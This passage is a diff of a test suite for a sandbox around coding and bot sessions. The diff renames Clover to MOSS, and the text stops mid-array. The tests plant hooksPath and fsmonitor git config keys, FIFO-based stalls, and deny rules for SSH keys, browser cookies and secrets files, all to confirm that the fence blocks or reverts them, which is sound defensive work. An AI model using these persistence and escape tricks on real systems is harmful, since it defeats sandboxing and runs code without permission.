@@ -2,9 +2,9 @@ import { describe, expect, test } from "bun:test";
 import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, readlinkSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import type { Caller } from "@waifucave/clover-protocol";
+import type { Caller } from "@waifucave/moss-protocol";
 import { fenceContextFor, policyAllows } from "../../src/contracts/fence";
-import { CloverFence } from "../../src/fence/fence";
+import { MossFence } from "../../src/fence/fence";
 import { CONFIG_READ_CAP, WATCH_REPO_BUDGET, fencedSpawner, includeTargets, reposUnder, mkdirNoLinks, ownRepoHooks, repoConfigFiles, revertPlantedGitKeys, writeLocked } from "../../src/fence/fenced-process";
 import { bwrapArgs, bwrapPlan, heldFolderNote } from "../../src/fence/linux-bwrap";
 import { unixSocketFilter } from "../../src/fence/seccomp";
@@ -21,28 +21,28 @@ const here = process.platform === "darwin" ? "macos" : "linux";
 const botCaller = (bot: string, sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "bot", bot });
 
 function world() {
-  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
-  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
-  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
-  writeFileSync(join(clover, "settings.json"), "orig");
-  writeFileSync(join(clover, "run", "token"), "secret-ish");
-  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
+  const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-")));
+  const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp"), outside = join(root, "outside");
+  for (const d of [join(moss, "settings"), join(moss, "run"), join(moss, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
+  writeFileSync(join(moss, "settings.json"), "orig");
+  writeFileSync(join(moss, "run", "token"), "secret-ish");
+  const fence = new MossFence({ os: here, home, mossHome: moss, temp });
   const spawner = fencedSpawner({ fence });
   const run = (command: string, who: FencedRun["who"] = { caller: { kind: "session", sessionId: "c1", sessionKind: "coding" } }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: RUN_BOUND_MS, who });
-  return { root, home, clover, temp, outside, fence, spawner, run };
+  return { root, home, moss, temp, outside, fence, spawner, run };
 }
 
 function worldBot() {
-  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
-  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
-  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
-  writeFileSync(join(clover, "settings.json"), "orig");
-  writeFileSync(join(clover, "run", "token"), "secret-ish");
-  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
+  const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-")));
+  const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp"), outside = join(root, "outside");
+  for (const d of [join(moss, "settings"), join(moss, "run"), join(moss, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
+  writeFileSync(join(moss, "settings.json"), "orig");
+  writeFileSync(join(moss, "run", "token"), "secret-ish");
+  const fence = new MossFence({ os: here, home, mossHome: moss, temp });
   const spawner = fencedSpawner({ fence });
   // A bot's own session (main conversation or side thread)
   const run = (command: string, who: FencedRun["who"] = { caller: botCaller("luna", "s1") }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: RUN_BOUND_MS, who });
-  return { root, home, clover, temp, outside, fence, spawner, run };
+  return { root, home, moss, temp, outside, fence, spawner, run };
 }
 
 const ok = (r: FencedRunResult) => r.kind === "exited" && r.code === 0;
@@ -54,31 +54,31 @@ const denied = (r: FencedRunResult) => r.kind === "exited" && r.code !== 0;
 const RUN_BOUND_MS = 60_000;
 
 describe("the macOS profile, as text", () => {
-  test("Clover home default-deny first; holder folders; outside naming; specific fenced denies", () => {
-    // Policy matching the real fence: Clover home in denyWrite/denyRead for default-deny,
+  test("MOSS home default-deny first; holder folders; outside naming; specific fenced denies", () => {
+    // Policy matching the real fence: MOSS home in denyWrite/denyRead for default-deny,
     // plus specific fenced items, one of them outside the home.
-    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
+    const p = macFenceProfile({ mossHome: "/U/me/.moss", home: "/U/me", perUserTemp: null, policy: {
       allowWrite: ["/U/me", "/tmp/x"],
-      denyWrite: ["/U/me/.clover/settings.json", "/U/me/.clover/plugins-state/oks", "/U/me/.clover", "/U/me/Library/LaunchAgents/com.waifucave.clover.core.plist"],
-      denyRead: ["/U/me/.clover/run", "/U/me/.clover"],
+      denyWrite: ["/U/me/.moss/settings.json", "/U/me/.moss/plugins-state/oks", "/U/me/.moss", "/U/me/Library/LaunchAgents/com.waifucave.moss.core.plist"],
+      denyRead: ["/U/me/.moss/run", "/U/me/.moss"],
       closedDoors: ["open", "launchctl", "osascript"], blockedAddresses: [], network: "none" } });
     const at = (s: string) => p.indexOf(s);
     // Strings stored in variables to avoid TypeScript parser issues with parentheses in string literals.
-    const denyCloverHome = '(deny file-write* (subpath "/U/me/.clover")';
+    const denyMossHome = '(deny file-write* (subpath "/U/me/.moss")';
     const allowWriteSubpath = '(allow file-write* (subpath';
     const denyHomeLiteral = '(deny file-write* (literal "/U/me")';
-    const denySettingsJson = '(subpath "/U/me/.clover/settings.json")';
-    const denyPluginsStateOks = '(subpath "/U/me/.clover/plugins-state/oks")';
-    const denyLaunchAgentsPlist = '(subpath "/U/me/Library/LaunchAgents/com.waifucave.clover.core.plist")';
-    const denyRunSubpath = '(deny file-read* (subpath "/U/me/.clover/run")';
-    // 1. Clover home default-deny (subpath) comes after allowWrite
-    expect(at(denyCloverHome)).toBeGreaterThan(at(allowWriteSubpath));
-    // 2. Holder folder denies (literal) come after the Clover home deny (and after the naming allows, below)
-    expect(at(denyHomeLiteral)).toBeGreaterThan(at(denyCloverHome)); // renaming home moves Clover home
+    const denySettingsJson = '(subpath "/U/me/.moss/settings.json")';
+    const denyPluginsStateOks = '(subpath "/U/me/.moss/plugins-state/oks")';
+    const denyLaunchAgentsPlist = '(subpath "/U/me/Library/LaunchAgents/com.waifucave.moss.core.plist")';
+    const denyRunSubpath = '(deny file-read* (subpath "/U/me/.moss/run")';
+    // 1. MOSS home default-deny (subpath) comes after allowWrite
+    expect(at(denyMossHome)).toBeGreaterThan(at(allowWriteSubpath));
+    // 2. Holder folder denies (literal) come after the MOSS home deny (and after the naming allows, below)
+    expect(at(denyHomeLiteral)).toBeGreaterThan(at(denyMossHome)); // renaming home moves MOSS home
     expect(p).not.toContain('(literal "/U")'); // above writable roots nothing writable
-    // 3. No naming handling for folders inside the Clover home: the home deny refuses every new name there.
-    expect(p).not.toContain("clover/plugins-state/[ -.0-~]");
-    expect(p).not.toContain("clover/sdk/[ -.0-~]");
+    // 3. No naming handling for folders inside the MOSS home: the home deny refuses every new name there.
+    expect(p).not.toContain("moss/plugins-state/[ -.0-~]");
+    expect(p).not.toContain("moss/sdk/[ -.0-~]");
     // Naming handling only outside the home (the login places): deny non-ASCII names, then allow ASCII ones.
     const nameLaunchAgentsDeny = '(deny file-write* (regex #"^/U/me/Library/LaunchAgents/[^/]"))';
     const nameLaunchAgentsAllow = '(allow file-write* (regex #"^/U/me/Library/LaunchAgents/[ -.0-~]+(/|$)"))';
@@ -93,57 +93,57 @@ describe("the macOS profile, as text", () => {
     expect(at(denyPluginsStateOks)).toBeGreaterThan(at(nameLaunchAgentsAllow));
     expect(at(denyLaunchAgentsPlist)).toBeGreaterThan(at(nameLaunchAgentsAllow));
     expect(p).toContain(denyRunSubpath);
-    expect(p).toContain('(allow file-read* (subpath "/U/me/.clover/git-template"))'); // Clover's empty git template reads
+    expect(p).toContain('(allow file-read* (subpath "/U/me/.moss/git-template"))'); // MOSS's empty git template reads
     expect(p).toContain('(deny process-exec (literal "/usr/bin/open") (literal "/bin/launchctl") (literal "/usr/bin/osascript"))');
     expect(p.trim().endsWith("(deny network*)")).toBe(true);
   });
 
   test("naming allows come before the home deny in effect, and never reach inside it", () => {
     // A fenced item directly under /U would make /U a naming folder that contains the home: skipped.
-    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
-      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover", "/U/x"], denyRead: ["/U/me/.clover"],
+    const p = macFenceProfile({ mossHome: "/U/me/.moss", home: "/U/me", perUserTemp: null, policy: {
+      allowWrite: ["/U/me"], denyWrite: ["/U/me/.moss", "/U/x"], denyRead: ["/U/me/.moss"],
       closedDoors: [], blockedAddresses: [], network: "none" } });
     expect(p).not.toContain('(regex #"^/U/[^/]")');
     expect(p).not.toContain('(regex #"^/U/[ -.0-~]');
   });
 
   test("no naming rules for a fenced item's folder outside every writable root (#321's review)", () => {
-    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
-      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover", "/opt/homebrew/lib/node_modules/@openai/codex", "/U/me/Library/LaunchAgents"],
-      denyRead: ["/U/me/.clover"], closedDoors: [], blockedAddresses: [], network: "none" } });
+    const p = macFenceProfile({ mossHome: "/U/me/.moss", home: "/U/me", perUserTemp: null, policy: {
+      allowWrite: ["/U/me"], denyWrite: ["/U/me/.moss", "/opt/homebrew/lib/node_modules/@openai/codex", "/U/me/Library/LaunchAgents"],
+      denyRead: ["/U/me/.moss"], closedDoors: [], blockedAddresses: [], network: "none" } });
     expect(p).not.toContain("node_modules/@openai/[");
     expect(p).not.toContain('(allow file-write* (regex #"^/opt/');
     expect(p).toContain('(allow file-write* (regex #"^/U/me/Library/[ -.0-~]+(/|$)"))'); // inside the root: as before
   });
 
   test("the caller's rules: its own folders read and write after the denies; the home stays denied otherwise", () => {
-    const caller = callerPlaces("/U/me/.clover", "macos", { sessionId: "s1", memoryOf: "luna" });
-    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, caller, policy: {
-      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover"], denyRead: ["/U/me/.clover"],
+    const caller = callerPlaces("/U/me/.moss", "macos", { sessionId: "s1", memoryOf: "luna" });
+    const p = macFenceProfile({ mossHome: "/U/me/.moss", home: "/U/me", perUserTemp: null, caller, policy: {
+      allowWrite: ["/U/me"], denyWrite: ["/U/me/.moss"], denyRead: ["/U/me/.moss"],
       closedDoors: [], blockedAddresses: [], network: "none" } });
     const at = (s: string) => p.indexOf(s);
-    const homeDeny = '(deny file-write* (subpath "/U/me/.clover")';
-    const allowOwnBot = '(allow file-read* (regex #"^/U/me/\\.clover/bots/luna(/|$)"))';
-    const allowMemoryRw = '(allow file-read* file-write* (regex #"^/U/me/\\.clover/bots/luna/memory/"))';
-    const denyMemoryWrite = '(deny file-write* (literal "/U/me/.clover/bots/luna/memory"))';
+    const homeDeny = '(deny file-write* (subpath "/U/me/.moss")';
+    const allowOwnBot = '(allow file-read* (regex #"^/U/me/\\.moss/bots/luna(/|$)"))';
+    const allowMemoryRw = '(allow file-read* file-write* (regex #"^/U/me/\\.moss/bots/luna/memory/"))';
+    const denyMemoryWrite = '(deny file-write* (literal "/U/me/.moss/bots/luna/memory"))';
     // The owner's bot folder reads, its memory reads and writes (but never over itself), after the home deny.
     expect(at(allowOwnBot)).toBeGreaterThan(at(homeDeny));
     expect(at(allowMemoryRw)).toBeGreaterThan(at(homeDeny));
     expect(at(denyMemoryWrite)).toBeGreaterThan(at(allowMemoryRw));
     // Its session's outputs, its scratch and its routines read and write too.
-    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/s1/"))');
-    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/scratch/luna/"))');
-    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/routines/luna/"))');
+    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.moss/outputs/s1/"))');
+    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.moss/scratch/luna/"))');
+    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.moss/routines/luna/"))');
     // No plugin-data allow: this runner is no plugin.
     expect(p).not.toContain("plugin-data");
     // A runner that is a coding session gets its outputs, and no bot folder, memory, scratch or routines.
-    const someoneElse = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
+    const someoneElse = macFenceProfile({ mossHome: "/U/me/.moss", home: "/U/me", perUserTemp: null, policy: {
       allowWrite: ["/U/me"], denyWrite: [], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" },
-      caller: callerPlaces("/U/me/.clover", "macos", { sessionId: "c1" }) });
-    expect(someoneElse).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/c1/"))');
-    expect(someoneElse).not.toContain("/U/me/\\.clover/bots/");
-    expect(someoneElse).not.toContain("/U/me/\\.clover/scratch/");
-    expect(someoneElse).not.toContain("/U/me/\\.clover/routines/");
+      caller: callerPlaces("/U/me/.moss", "macos", { sessionId: "c1" }) });
+    expect(someoneElse).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.moss/outputs/c1/"))');
+    expect(someoneElse).not.toContain("/U/me/\\.moss/bots/");
+    expect(someoneElse).not.toContain("/U/me/\\.moss/scratch/");
+    expect(someoneElse).not.toContain("/U/me/\\.moss/routines/");
   });
 });
 
@@ -158,7 +158,7 @@ darwinDescribe("macOS: everything a command starts ends with its run, before the
     let src: string;
     try { src = join(dirname(Bun.resolveSync("@waifucave/clover-agent-runtime/package.json", import.meta.dir)), "native", "process-holder.c"); } catch { return undefined; }
     if (!existsSync(src)) return undefined;
-    const out = join(realpathSync(mkdtempSync(join(tmpdir(), "clover-holder-bin-"))), "clover-process-holder");
+    const out = join(realpathSync(mkdtempSync(join(tmpdir(), "moss-holder-bin-"))), "moss-process-holder");
     try { if (Bun.spawnSync(["/usr/bin/clang", "-O2", "-o", out, src]).exitCode === 0) built.path = out; } catch { /* no compiler */ }
     return built.path;
   };
@@ -171,11 +171,11 @@ darwinDescribe("macOS: everything a command starts ends with its run, before the
     test(`a \`set -m\` job that sets core.hooksPath after the run: ended, and the key never lands (${mode})`, async () => {
       const holder = mode === "the process holder" ? holderBin() : null;
       if (mode === "the process holder") expect(holder).toBeDefined();
-      const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-setm-")));
-      const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), project = join(home, "project");
-      for (const d of [clover, project, temp]) mkdirSync(d, { recursive: true });
+      const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-setm-")));
+      const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp"), project = join(home, "project");
+      for (const d of [moss, project, temp]) mkdirSync(d, { recursive: true });
       expect(Bun.spawnSync(["git", "init", "-q", project]).exitCode).toBe(0);
-      const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp });
+      const fence = new MossFence({ os: "macos", home, mossHome: moss, temp });
       const spawner = fencedSpawner({ fence, processHolder: holder ?? null });
       const tag = `${Date.now() % 100000}${Math.floor(Math.random() * 10)}`;
       // The job sleeps far longer than any run takes, even on a loaded CI runner: a run that waited for it would take
@@ -198,11 +198,11 @@ darwinDescribe("macOS: everything a command starts ends with its run, before the
   }
 
   test("the second line: a key set after a run ended is reverted when the turn or session ends", async () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-recheck-")));
-    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), project = join(home, "project");
-    for (const d of [clover, project, temp]) mkdirSync(d, { recursive: true });
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-recheck-")));
+    const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp"), project = join(home, "project");
+    for (const d of [moss, project, temp]) mkdirSync(d, { recursive: true });
     expect(Bun.spawnSync(["git", "init", "-q", project]).exitCode).toBe(0);
-    const spawner = fencedSpawner({ fence: new CloverFence({ os: "macos", home, cloverHome: clover, temp }), processHolder: null });
+    const spawner = fencedSpawner({ fence: new MossFence({ os: "macos", home, mossHome: moss, temp }), processHolder: null });
     expect(ok(await spawner.run({ command: "true", cwd: project, env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who: { caller: { kind: "session", sessionId: "s-re", sessionKind: "coding" } } }))).toBe(true);
     const config = join(project, ".git", "config");
     const before = readFileSync(config, "utf8");
@@ -220,11 +220,11 @@ darwinDescribe("macOS: everything a command starts ends with its run, before the
 
 darwinDescribe("a fenced item outside every writable root, on the real sandbox (#321's review)", () => {
   test("a write beside it is refused, as everything outside the roots is", async () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-out-")));
-    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-out-")));
+    const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp");
     const modules = join(root, "global", "lib", "node_modules"), install = join(modules, "@openai", "codex");
-    for (const d of [clover, join(home, "project"), temp, install]) mkdirSync(d, { recursive: true });
-    const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp, agentInstalls: [install] });
+    for (const d of [moss, join(home, "project"), temp, install]) mkdirSync(d, { recursive: true });
+    const fence = new MossFence({ os: "macos", home, mossHome: moss, temp, agentInstalls: [install] });
     expect(fence.policy().denyWrite).toContain(install);
     const spawner = fencedSpawner({ fence });
     const run = (command: string) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who: { caller: { kind: "session", sessionId: "c1", sessionKind: "coding" } } });
@@ -236,11 +236,11 @@ darwinDescribe("a fenced item outside every writable root, on the real sandbox (
   });
 
   test("watch: a session whose commands run elsewhere gets the same second line at its turn's end", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-watch-")));
-    const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), project = join(home, "project");
-    for (const d of [clover, project, temp]) mkdirSync(d, { recursive: true });
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-watch-")));
+    const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp"), project = join(home, "project");
+    for (const d of [moss, project, temp]) mkdirSync(d, { recursive: true });
     expect(Bun.spawnSync(["git", "init", "-q", project]).exitCode).toBe(0);
-    const spawner = fencedSpawner({ fence: new CloverFence({ os: process.platform === "darwin" ? "macos" : "linux", home, cloverHome: clover, temp }) });
+    const spawner = fencedSpawner({ fence: new MossFence({ os: process.platform === "darwin" ? "macos" : "linux", home, mossHome: moss, temp }) });
     if (!spawner.available) return; // no fenced process on this computer: no spawner to watch with
     const config = join(project, ".git", "config");
     const before = readFileSync(config, "utf8");
@@ -258,15 +258,15 @@ darwinDescribe("a fenced item outside every writable root, on the real sandbox (
   });
 
   test("watch: every repo in the session's writable folders, and one made mid-session, rechecked after each call", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-watch2-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-watch2-")));
     try {
-      const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
-      const own = join(clover, "scratch", "luna"), other = join(clover, "scratch", "sol"), memory = join(clover, "bots", "sol", "memory");
+      const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp");
+      const own = join(moss, "scratch", "luna"), other = join(moss, "scratch", "sol"), memory = join(moss, "bots", "sol", "memory");
       for (const d of [own, other, memory, temp]) mkdirSync(d, { recursive: true });
       for (const r of [join(own, "a"), join(other, "deep", "er", "b"), memory]) expect(Bun.spawnSync(["git", "init", "-q", r]).exitCode).toBe(0);
-      const spawner = fencedSpawner({ fence: new CloverFence({ os: process.platform === "darwin" ? "macos" : "linux", home, cloverHome: clover, temp }) });
+      const spawner = fencedSpawner({ fence: new MossFence({ os: process.platform === "darwin" ? "macos" : "linux", home, mossHome: moss, temp }) });
       if (!spawner.available) return;
-      spawner.watch!("s-w2", own, [join(clover, "scratch"), join(clover, "bots")]);
+      spawner.watch!("s-w2", own, [join(moss, "scratch"), join(moss, "bots")]);
       const plant = (config: string) => writeFileSync(config, `${readFileSync(config, "utf8")}[core]\n\tfsmonitor = /tmp/x\n`);
       // A Bash call plants a key in another bot's repo deep in its scratch folder: the recheck after that call reverts it.
       const deep = join(other, "deep", "er", "b", ".git", "config");
@@ -304,7 +304,7 @@ darwinDescribe("a fenced item outside every writable root, on the real sandbox (
       expect(spawner.recheck!("s-w2")).toMatch(/link planted as a git config.*core\.fsmonitor/);
       expect(existsSync(join(bare, "config"))).toBe(false);
       // A scratch folder made mid-session (a new bot's) is looked over too.
-      const newbot = join(clover, "scratch", "newbot", "r");
+      const newbot = join(moss, "scratch", "newbot", "r");
       expect(Bun.spawnSync(["git", "init", "-q", newbot]).exitCode).toBe(0);
       plant(join(newbot, ".git", "config"));
       expect(spawner.recheck!("s-w2", { end: true })).toMatch(/core\.fsmonitor/);
@@ -316,7 +316,7 @@ darwinDescribe("a fenced item outside every writable root, on the real sandbox (
   });
 
   test("reposUnder: at any depth, a node_modules and a bare repo included, never through a link; only folders count toward the budget, and it says when it stops", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-repos-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-repos-")));
     try {
       const at = (...p: string[]) => join(root, ...p);
       const deep = at("1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "r");
@@ -348,15 +348,15 @@ darwinDescribe("a fenced item outside every writable root, on the real sandbox (
   });
 
   test("a watched config that is a FIFO, a link to one or to /dev/zero, or too big never stalls the recheck (#366's review)", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-fifo-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-fifo-")));
     try {
-      const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
-      const scratch = join(clover, "scratch", "sol");
+      const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp");
+      const scratch = join(moss, "scratch", "sol");
       for (const d of [scratch, temp]) mkdirSync(d, { recursive: true });
       for (const r of ["fifo", "tofifo", "zero", "big", "bigl"]) expect(Bun.spawnSync(["git", "init", "-q", join(scratch, r)]).exitCode).toBe(0);
-      const spawner = fencedSpawner({ fence: new CloverFence({ os: process.platform === "darwin" ? "macos" : "linux", home, cloverHome: clover, temp }) });
+      const spawner = fencedSpawner({ fence: new MossFence({ os: process.platform === "darwin" ? "macos" : "linux", home, mossHome: moss, temp }) });
       if (!spawner.available) return;
-      spawner.watch!("s-fifo", scratch, [join(clover, "scratch")]);
+      spawner.watch!("s-fifo", scratch, [join(moss, "scratch")]);
       const cfg = (r: string) => join(scratch, r, ".git", "config");
       // A FIFO in place of a config, a link to a FIFO, a link to /dev/zero.
       rmSync(cfg("fifo")); expect(Bun.spawnSync(["mkfifo", cfg("fifo")]).exitCode).toBe(0);
@@ -378,15 +378,15 @@ darwinDescribe("a fenced item outside every writable root, on the real sandbox (
   }, 20_000);
 
   test("the repo walk's stop is said once a turn", () => {
-    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-budget-")));
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-fp-budget-")));
     try {
-      const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp");
-      const scratch = join(clover, "scratch", "sol");
+      const home = join(root, "home"), moss = join(home, ".moss"), temp = join(root, "tmp");
+      const scratch = join(moss, "scratch", "sol");
       for (let i = 0; i < WATCH_REPO_BUDGET / 1000 + 1; i++) for (let k = 0; k < 1000; k++) mkdirSync(join(scratch, `d${i}`, `e${k}`), { recursive: true });
       mkdirSync(temp, { recursive: true });
-      const spawner = fencedSpawner({ fence: new CloverFence({ os: process.platform === "darwin" ? "macos" : "linux", home, cloverHome: clover, temp }) });
+      const spawner = fencedSpawner({ fence: new MossFence({ os: process.platform === "darwin" ? "macos" : "linux", home, mossHome: moss, temp }) });
       if (!spawner.available) return;
-      spawner.watch!("s-budget", scratch, [join(clover, "scratch")]);
+      spawner.watch!("s-budget", scratch, [join(moss, "scratch")]);
       // Said once a turn: the first recheck of each turn that runs out says so; the rest of that turn don't.
       expect(spawner.recheck!("s-budget", { turn: "t1" })).toMatch(/repo watch stopped after/);
       expect(spawner.recheck!("s-budget", { turn: "t1" })).toBeNull();
@@ -406,21 +406,21 @@ darwinDescribe("the profile agrees with policyAllows, on the real sandbox", () =
       { kind: "plugin", pluginId: "tarot" },
     ];
     for (const caller of callers) {
-      const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-equiv-")));
+      const root = realpathSync(mkdtempSync(join(tmpdir(), "moss-equiv-")));
       try {
-        const home = join(root, "home"), clover = join(home, ".clover");
+        const home = join(root, "home"), moss = join(home, ".moss");
         const sid = caller.kind === "session" ? caller.sessionId : "nobody";
         const bseg = caller.kind === "session" && (caller.sessionKind === "bot" || caller.sessionKind === "side-thread") ? caller.bot!.replace("/", "--") : null;
-        const ownScratch = bseg === null ? join(clover, "scratch", "luna") : join(clover, "scratch", bseg);
-        const ownRoutines = bseg === null ? join(clover, "routines", "luna") : join(clover, "routines", bseg);
-        const ownOutputs = join(clover, "outputs", sid);
-        const ownPluginData = caller.kind === "plugin" ? join(clover, "plugin-data", String(caller.pluginId).replace("/", "--")) : join(clover, "plugin-data", "tarot");
-        const dirs = [join(clover, "run"), join(clover, "plugins-state", "oks"), join(clover, "sessions-runtime"), join(clover, "projects", "k"),
-          join(clover, "bots", "luna", "memory"), join(clover, "bots", "luna", "agents"), join(clover, "bots", "sol", "memory"),
-          join(clover, "bots", "alpha", "memory"), join(home, "project"), join(clover, "sdk"),
-          join(clover, "scratch", "luna"), join(clover, "scratch", "alpha"),
-          join(clover, "routines", "luna"), join(clover, "routines", "alpha"),
-          join(clover, "plugin-data", "tarot"), join(clover, "plugin-data", "luna"), ownOutputs,
+        const ownScratch = bseg === null ? join(moss, "scratch", "luna") : join(moss, "scratch", bseg);
+        const ownRoutines = bseg === null ? join(moss, "routines", "luna") : join(moss, "routines", bseg);
+        const ownOutputs = join(moss, "outputs", sid);
+        const ownPluginData = caller.kind === "plugin" ? join(moss, "plugin-data", String(caller.pluginId).replace("/", "--")) : join(moss, "plugin-data", "tarot");
+        const dirs = [join(moss, "run"), join(moss, "plugins-state", "oks"), join(moss, "sessions-runtime"), join(moss, "projects", "k"),
+          join(moss, "bots", "luna", "memory"), join(moss, "bots", "luna", "agents"), join(moss, "bots", "sol", "memory"),
+          join(moss, "bots", "alpha", "memory"), join(home, "project"), join(moss, "sdk"),
+          join(moss, "scratch", "luna"), join(moss, "scratch", "alpha"),
+          join(moss, "routines", "luna"), join(moss, "routines", "alpha"),
+          join(moss, "plugin-data", "tarot"), join(moss, "plugin-data", "luna"), ownOutputs,
           join(home, "Library", "LaunchAgents"),
           join(home, ".ssh"), join(home, "bin"), join(home, ".local", "bin"),
           join(home, ".config", "git"), join(home, ".config", "fish", "conf.d"),
@@ -428,50 +428,50 @@ darwinDescribe("the profile agrees with policyAllows, on the real sandbox", () =
           join(home, ".vim"), join(home, ".config", "nvim"), join(home, ".gnupg"),
           join(home, ".config", "pip"), join(home, ".bun", "bin"), join(home, ".cargo", "bin"),
           join(home, ".oh-my-zsh", "custom"), join(home, "Library", "Preferences"), join(home, "Library", "Scripts"),
-          join(home, "project", ".git", "hooks"), join(clover, "browser", "profiles", "p1", "Default"), join(clover, "sdk", "projects", "k")];
+          join(home, "project", ".git", "hooks"), join(moss, "browser", "profiles", "p1", "Default"), join(moss, "sdk", "projects", "k")];
         for (const d of dirs) mkdirSync(d, { recursive: true });
         const files: Record<string, string> = {
-          [join(clover, "settings.json")]: "s", [join(clover, "run", "tok")]: "t",
-          [join(clover, "bots", "luna", "memory", "MEMORY.md")]: "l", [join(clover, "bots", "luna", "agents", "t.json")]: "{}",
-          [join(clover, "bots", "sol", "memory", "MEMORY.md")]: "s", [join(clover, "sessions-runtime", "rt.json")]: "{}",
-          [join(clover, "projects", "k", "s.jsonl")]: "{}", [join(home, "project", "a.txt")]: "a",
+          [join(moss, "settings.json")]: "s", [join(moss, "run", "tok")]: "t",
+          [join(moss, "bots", "luna", "memory", "MEMORY.md")]: "l", [join(moss, "bots", "luna", "agents", "t.json")]: "{}",
+          [join(moss, "bots", "sol", "memory", "MEMORY.md")]: "s", [join(moss, "sessions-runtime", "rt.json")]: "{}",
+          [join(moss, "projects", "k", "s.jsonl")]: "{}", [join(home, "project", "a.txt")]: "a",
           [join(home, "project", "del.txt")]: "d", [join(ownOutputs, "r.md")]: "r", [join(ownOutputs, "del.md")]: "d",
-          [join(clover, "browser", "profiles", "p1", "Default", "Cookies")]: "c", [join(clover, "browser", "profiles", "p1", "Default", "Login Data")]: "c",
-          [join(clover, "secrets.enc")]: "e", [join(clover, "secrets.key")]: "k", [join(clover, "sdk", "settings.json")]: "{}",
-          [join(clover, "projects", "k", "s.provider-state.jsonl")]: "{}", [join(clover, "sdk", "projects", "k", "s.provider-state.jsonl")]: "{}",
-          [join(clover, "sdk", "projects", "k", "s.jsonl")]: "{}",
